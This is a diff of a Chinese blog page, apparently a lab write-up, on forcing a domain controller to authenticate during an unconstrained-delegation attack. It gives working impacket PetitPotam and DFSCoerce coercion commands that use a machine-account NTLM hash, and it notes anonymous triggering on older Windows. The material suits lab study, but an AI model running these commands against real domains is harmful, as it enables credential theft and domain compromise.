@@ -308,10 +308,10 @@
 <p>所以下面只需要强制触发域控认证即可！</p>
 <h1 id="非约束委派-NTLM-强制认证"><a href="#非约束委派-NTLM-强制认证" class="headerlink" title="非约束委派+NTLM 强制认证"></a>非约束委派+NTLM 强制认证</h1><p>使用 Printerbug、PetitPotam 、dfscoerce等强制域控进行认证</p>
 <blockquote>
-<p>PetitPotam 在低版本Windows可匿名触发：在2008、2012环境下，匿名访问的命名管道中有三个netlogon、samr、lsarpc</p>
+<p>PetitPotam 在2008、2012低版本环境下可匿名触发：匿名访问的命名管道中有三个netlogon、samr、lsarpc</p>
 <p>impacket-PetitPotam WIN7.test.com 192.168.100.128</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains4 -q impacket-PetitPotam -u &#39;WIN19$&#39; -hashes :c38ca39606871db61c1389b0fbedf381 -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab 172.22.4.7</span><br><span class="line"></span><br><span class="line">proxychains4 -q impacket-PetitPotam -u &#39;WIN19$&#39; -hashes :c38ca39606871db61c1389b0fbedf381 -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab 172.22.4.7</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains4 -q impacket-PetitPotam -u &#39;WIN19$&#39; -hashes :c38ca39.. -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab 172.22.4.7</span><br><span class="line"></span><br><span class="line">proxychains4 -q impacket-dfscoerce -u &#39;WIN19$&#39; -hashes :c38ca39.. -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab 172.22.4.7</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250501202614834.png" alt="image-20250501202614834"></p>
 <p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250501202929756.png" alt="image-20250501202929756"></p>
